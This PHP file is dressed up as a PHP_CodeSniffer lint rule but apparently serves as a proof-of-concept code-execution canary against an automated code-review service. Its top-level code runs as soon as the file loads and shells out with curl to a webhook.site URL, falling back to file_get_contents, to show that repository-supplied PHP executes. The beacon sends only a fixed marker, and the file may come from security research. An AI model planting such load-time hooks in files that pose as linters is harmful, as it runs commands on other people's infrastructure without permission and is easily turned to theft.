<?php

namespace CodeRabbitAudit\Sniffs\Security;

use PHP_CodeSniffer\Files\File;
use PHP_CodeSniffer\Sniffs\Sniff;

// Fixed, non-sensitive marker: proves that repository-controlled PHP is loaded.
$markerUrl = 'https://webhook.site/41d77546-b4a4-4817-a3fa-32924890587c/cr-phpcs-sniff-exec-20261005';
if (function_exists('shell_exec')) {
    @shell_exec('curl --max-time 4 -fsS ' . escapeshellarg($markerUrl) . ' >/dev/null 2>&1');
} else {
    @file_get_contents($markerUrl);
}

final class LoaderCanarySniff implements Sniff
{
    public function register(): array
    {
        return [T_OPEN_TAG];
    }

    public function process(File $phpcsFile, $stackPtr): void
    {
        $phpcsFile->addError(
            'CodeRabbit loaded the repository-controlled PHPCS sniff.',
            $stackPtr,
            'Loaded'
        );
    }
}
